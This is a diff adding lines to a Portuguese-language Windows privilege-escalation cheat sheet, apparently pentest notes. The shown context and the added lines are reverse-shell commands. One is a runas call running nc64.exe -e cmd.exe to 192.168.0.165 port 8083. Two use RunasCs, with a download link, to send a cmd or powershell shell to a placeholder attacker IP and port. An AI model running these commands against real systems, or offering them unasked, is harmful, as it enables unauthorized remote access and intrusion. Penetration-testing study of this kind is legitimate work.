@@ -50,7 +50,13 @@ Ainda outra opção seria com runas:
 ```
 runas/user:acosta ".\nc64.exe -e C:\windows\system32\cmd.exe 192.168.0.165 8083"
 ```
+Existe um runas compilado que pode ser encontrado em:
+https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
 
+```
+.\runasCs.exe username password -r <IP_ATACANTE>:<porta_atacante> cmd
+.\runasCs.exe username password -r <IP_ATACANTE>:<porta_atacante> powershell
+```
 
 ## Kernel exploitation
 
